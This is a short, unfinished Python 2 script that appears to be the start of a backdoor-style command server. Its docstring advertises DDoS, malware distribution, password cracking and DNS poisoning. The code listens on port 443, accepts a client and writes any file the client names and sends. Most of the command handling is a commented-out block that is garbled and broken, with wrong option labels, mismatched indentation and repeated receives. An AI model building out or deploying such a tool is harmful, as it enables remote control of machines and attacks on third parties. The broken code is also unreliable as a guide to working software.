import socket
import os
import subprocess
import time


'''
Purpose: Create a server that will listen for commands from the client and then execute those commands on the host machine.

Built-in Commands: 
	- Information Gathering
	- Scanning
	- Password Cracking
	- DDOS
	- Malware distribution
	- Can create/destroy servers (mail, web, etc.)
	- Webserver (fake webpage)
	- DNS Poisoning
'''
### Flags ###
isConnected = False

### Global Variables ###
HOST = ''
PORT = 443
NUM_CONNECTION = 1
NUM_BYTES = 1024


### Functions ###
def send_data(sock, data):
	return
	
	
def save_data(conn):
	fname = conn.recv(NUM_BYTES)
	fobj  = file(fname, 'w+')
	data  = conn.recv(NUM_BYTES)
	fobj.write(data)
	fobj.close()
	conn.close()
	return fname

def recv_data(sock,data):
	data = sock.recv(NUM_BYTES)
	print data
	return data


def recon(conn):
	recon_list = ["USERS", "NETWORK"]
	conn.send("Options: [USERS], [NETWORK]")
	if conn.recv(NUM_BYTES) == recon_list[0]:
		user_list = ["CREATE", "DELETE", "USERLIST"]
		conn.send("---USERS---")
		conn.send("Options: [CREATE], [DELETE], [USERLIST]")
	

def main():
	opt_list = ["SAVE","LOAD","RECON"]
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create socket object
	server.bind((HOST,PORT)) #Attack server to all interfaces and on port 443
	server.listen(NUM_CONNECTION) #How many clients server should be listening for
	conn, addr = server.accept() #When a client connects it returns a tuple of a connection object and the address information
	hostname = socket.gethostname()
	print "%s has connected." % hostname

'''
    if conn.recv(NUM_BYTES) == opt_list[2]: # save
	    
			if conn.recv(NUM_BYTES) == user_list[0]:
				return
			elif conn.recv(NUM_BYTES) == user_list[1]:
				return
			elif conn.recv(NUM_BYTES) == user_list[2]:
				return
		elif conn.recv(NUM_BYTES) == recon_list[1]:
			network_list = ["ARP", "INTERFACES"]
			conn.send("---NETWORK---")
			conn.send("Options: [ARP], [INTERFACES]")
			
		
	print "%s has connected on port %s." % addr
	isConnected = True
	
'''	
		
	
	
	
main()
